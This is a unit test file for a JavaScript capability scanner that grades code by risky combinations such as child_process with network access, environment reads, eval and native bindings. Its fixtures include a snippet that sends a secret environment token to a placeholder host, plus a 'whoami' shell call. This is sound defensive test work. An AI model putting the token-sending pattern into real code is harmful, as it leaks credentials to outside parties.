import {describe, expect, it} from 'vitest';
import {FileFingerprint} from '../Fingerprint/Fingerprint.js';
import {CapabilityScanner, CapabilitySeverity} from '../Security/CapabilityScanner.js';

function f(path: string, content: string): FileFingerprint {
    return {path, sha256: 'x', size: content.length, content};
}

describe('CapabilityScanner.scan', () => {
    it('returns null for pure-logic code', () => {
        expect(CapabilityScanner.scan([
            f('lib/index.js', 'export function add(a, b) { return a + b; }')
        ])).toBeNull();
    });

    it('child_process + network combo lands as risk', () => {
        const finding = CapabilityScanner.scan([
            f('lib/index.js', `
                const cp = require('child_process');
                cp.exec('whoami');
                require('https');
            `)
        ]);
        expect(finding).not.toBeNull();
        expect(finding!.severity).toBe(CapabilitySeverity.risk);
        expect(finding!.capabilities).toContain('child-process');
        expect(finding!.capabilities).toContain('network');
    });

    it('credential env-read + network lands as risk', () => {
        const finding = CapabilityScanner.scan([
            f('lib/index.js', `
                const token = process.env.SECRET_TOKEN;
                fetch('https://x/' + token);
            `)
        ]);
        expect(finding!.severity).toBe(CapabilitySeverity.risk);
        expect(finding!.capabilities).toContain('env-read');
        expect(finding!.capabilities).toContain('network');
    });

    it('two heavy-hitter capabilities (no risky combo) land as warn', () => {
        const finding = CapabilityScanner.scan([
            f('lib/io.js', `
                const fs = require('fs');
                fs.writeFileSync('/tmp/x', 'hi');
                fetch('https://example.com');
            `)
        ]);
        expect(finding!.severity).toBe(CapabilitySeverity.warn);
    });

    it('dynamic-import alone lands as warn', () => {
        const finding = CapabilityScanner.scan([
            f('lib/x.js', 'const code = "1+2"; eval(code);')
        ]);
        expect(finding!.severity).toBe(CapabilitySeverity.warn);
        expect(finding!.capabilities).toContain('dynamic-import');
    });

    it('single capability lands as info', () => {
        const finding = CapabilityScanner.scan([
            f('lib/r.js', 'const fs = require("fs"); fs.readFileSync("./x");')
        ]);
        expect(finding!.severity).toBe(CapabilitySeverity.info);
        expect(finding!.capabilities).toEqual(['fs-read']);
    });

    it('skips files without content', () => {
        expect(CapabilityScanner.scan([
            {path: 'lib/native.so', sha256: 'x', size: 100}
        ])).toBeNull();
    });

    it('native bindings + child_process is risk', () => {
        const finding = CapabilityScanner.scan([
            f('lib/binding.js', `
                require('./native.node');
                const cp = require('child_process');
                cp.spawn('ls');
            `)
        ]);
        expect(finding!.severity).toBe(CapabilitySeverity.risk);
    });
});